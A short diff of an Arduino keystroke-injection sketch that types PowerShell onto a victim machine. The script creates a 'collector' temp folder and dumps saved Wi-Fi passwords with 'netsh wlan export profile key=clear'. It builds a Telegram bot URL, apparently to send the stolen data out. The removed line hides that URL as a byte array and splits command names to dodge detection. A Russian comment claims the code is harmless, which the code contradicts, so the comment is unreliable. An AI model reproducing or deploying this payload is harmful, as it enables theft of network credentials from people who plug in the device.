@@ -39,7 +39,7 @@ void setup() {
   // Вместо вредоносного скрипта введем команду, показывающую путь к temp-папке
   Keyboard.print("$t = \"BOT_TOKEN\"; ");
   Keyboard.print("$c = \"CHAT_ID\"; ");
-  Keyboard.print("$a = [System.Text.Encoding]::ASCII.GetString([byte[]](104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 116, 101, 108, 101, 103, 114, 97, 109, 46, 111, 114, 103, 47, 98, 111, 116)) + \"$t/sendMessage\"; $s = \"Free_Public_WiFi\"; $k = \"12345678\";  $d = \"ne\" + \"tsh\";  $r = \"Remove\" + \"-Item\"; $nf = [System.IO.Path]::GetTempPath() + \"collector\"; ");
+  Keyboard.print("$a = \"https://api.telegram.org/bot$token/sendMessage\"; ");
   Keyboard.print("IEX \"New-Item -Path `$env:TEMP -Name collector -ItemType Directory -Force\";");
   Keyboard.print("IEX \"Set-Location -Path $nf\";");
   Keyboard.print("IEX \"$d wlan export profile key=clear\";");
